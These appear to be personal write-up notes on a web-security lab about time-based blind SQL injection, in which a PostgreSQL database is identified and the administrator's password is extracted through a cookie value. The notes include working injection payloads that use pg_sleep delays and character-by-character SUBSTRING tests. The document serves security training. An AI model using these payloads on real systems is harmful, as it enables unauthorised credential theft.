# Blind SQL injection with time delays and information retrieval

#BLINDSQLI 
#WRITEUP 

The lab scenario is the same as [[Blind SQL injection with time delays]] but in this case the attacker must retrieve the password of the `administrator` user in the `users` table that contains an `username` and `password` columns.

## Trigger a time delay

First try to trigger a time delay with one of the payloads of [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) to determine the database type and construct an accurate query to exploit the vulnerability.

Testing the payloads I determined that the database type is `PostgreSQL` as I was able to trigger a time delay.

```SQL
' ; SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END --
```

Inject the cookie value with the URL encoded payload.

## Construct the query
```SQL
SELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, 1) > 'm')=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
```

## Retrieve data

Inject the cookie value with the URL encoded payload.

```SQL
' ; SELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, 1) != 'm')=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```


